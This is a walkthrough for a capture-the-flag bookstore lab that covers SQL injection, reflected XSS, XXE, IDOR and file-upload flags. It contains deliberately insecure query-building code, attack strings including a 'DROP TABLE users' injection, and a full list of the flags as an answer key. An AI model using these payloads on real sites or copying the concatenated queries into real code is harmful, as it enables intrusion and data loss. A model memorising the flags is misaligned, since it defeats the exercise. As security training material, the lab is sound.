# BookTryHackMe

Test your web hacking skills on a simulated bookstore website! Explore multiple pages with realistic-looking content while uncovering hidden vulnerabilities included are:

* **SQL Injection (SQLi)**
* **XML External Entity Injection (XXE)**
* **Insecure Direct Object Reference (IDOR)**
* **Reflected Cross-Site Scripting (XSS)**
* **File Upload (arbitrary .txt upload to trigger flags)**

Discover hidden flags by exploiting these vulnerabilities safely in a CTF environment.

---

# BookStore CTF - Detailed Walkthrough (Exploits + Code)

> **Note:** All exploit examples are for this controlled lab only. Never test these payloads against real, production systems.

---

## 1) SQL Injection (Login page)

**Location:** `GET/POST /login` – form on *Login* page.

**Why it’s vulnerable (server-side):**
The app builds a SQL string by concatenating user input (simulated in `app.py`), e.g.

```python
query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
```

Because input is inserted directly into the query string, classic SQL injection is possible.

**How to exploit (client-side input):**

* Open the Login page.
* In **Email** paste:

```
' OR '1'='1
```

* In **Password** put anything (e.g., `x`) and submit.

**Why this works:**
The injected email closes the first quote and adds an always-true clause (`'1'='1'`), making the WHERE clause true regardless of password.

**Expected result:**

```
CTF FLAG: THM{SQLi_successful}
```

---

## 2) SQL Injection (Register page)

**Location:** `GET/POST /register` – form on *Register* page.

**Why it’s vulnerable (server-side):**
The app simulates an `INSERT` statement using direct concatenation:

```python
query = f"INSERT INTO users (fullname, email, password) VALUES ('{fullname}', '{email}', '{password}')"
```

The route also detects patterns like `UNION SELECT`, `;`, or `OR 1=1` to mark a successful injection for the CTF.

**How to exploit (client-side input examples):**

* **UNION example (Full Name field):**

```
Alice' UNION SELECT 'a'--
```

Email: `test@example.com`
Password: anything

* **OR 1=1 example (Full Name or Email):**

```
eve@example.com' OR 1=1 --
```

* **Statement terminator example (Email field):**

```
bob@example.com; DROP TABLE users; --
```

**Why these work:**
They demonstrate common SQLi techniques: `UNION` to combine results, `OR 1=1` to force truth, and using `;` to terminate/append statements. The CTF route watches for these patterns.

**Expected result:**

```
THM{register_sqli_success}
```

---

## 3) Reflected XSS (Search page)

**Location:** `GET /search` - search input on *Search* page.

**Why it’s vulnerable (server-side / template):**
The search handler returns `query` to the template without escaping, allowing injected HTML/JS to run.

**How to exploit (client-side input):**

* Go to the Search page.
* Enter:

```html
<script>alert('XSS')</script>
```

* Submit.

**Why this works:**
The search input is reflected back into the page unescaped, so the browser executes the `<script>`.

**Expected result:**

```
You've unlocked a hidden book! FLAG: THM{reflected_xss_success}
```

---

## 4) IDOR - Hidden Book

**Location:** `GET /book?id=<id>` - Book Details page.

**Why it’s vulnerable (server-side):**
The app uses numeric IDs in the URL and does **no access restriction** for special IDs. The hidden CTF book exists at ID `99` but is omitted from lists.

**How to exploit (client-side):**

* Visit a normal book URL, e.g., `/book?id=1`.
* Change the `id` value to `99`.
* Reload the page.

**Expected result:**

```
FLAG: THM{idor_hidden_book}
```

---

## 5) IDOR - Hidden User (Profile)

**Location:** `GET /profile?id=<id>` - Profile page.

**Why it’s vulnerable:**
The `profile` route reads the `id` parameter and returns the corresponding entry from the `users` dictionary **without authorization checks**.

**How to exploit (client-side):**

* Visit `/profile?id=1`.
* Change ID to `99`.
* Reload.

**Expected result:**

```
FLAG: THM{idor_hidden_user}
```

---

## 6) XXE (XML External Entity) - Lab simulation

**Location:** `/xxe` endpoint (review submission posts here).

**Why it’s vulnerable / simulation note:**
Modern XML parsers often do not expand external entities by default. For safety, this lab **simulates XXE**: the route checks for `<!ENTITY xxe` or `&xxe;` and returns the flag when detected.

**How to exploit (client-side XML payload):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "THM{xxe_successful}">
]>
<root>
  <book>&xxe;</book>
</root>
```

Paste this into the review/XML textarea and submit.

**Expected result:**

```
FLAG: THM{Review_xxe_successful}
```

---

## 7) File Upload CTF

**Location:** `/upload` and `/upload_profile` routes.

**How it works:**
Uploading any `.txt` file triggers the flag.

**Example:**

* Upload `example.txt` in either form.
* The route detects `.txt` and displays the corresponding CTF flag:

```
THM{file_upload_successful}
THM{profile_upload_successful}
```

---

## 8) Final Objective

Collect all individual flags:

```
THM{SQLi_successful}
THM{register_sqli_success}
THM{reflected_xss_success}
THM{idor_hidden_book}
THM{idor_hidden_user}
THM{xxe_successful}
THM{Review_xxe_successful}
THM{file_upload_successful}
THM{profile_upload_successful}
```
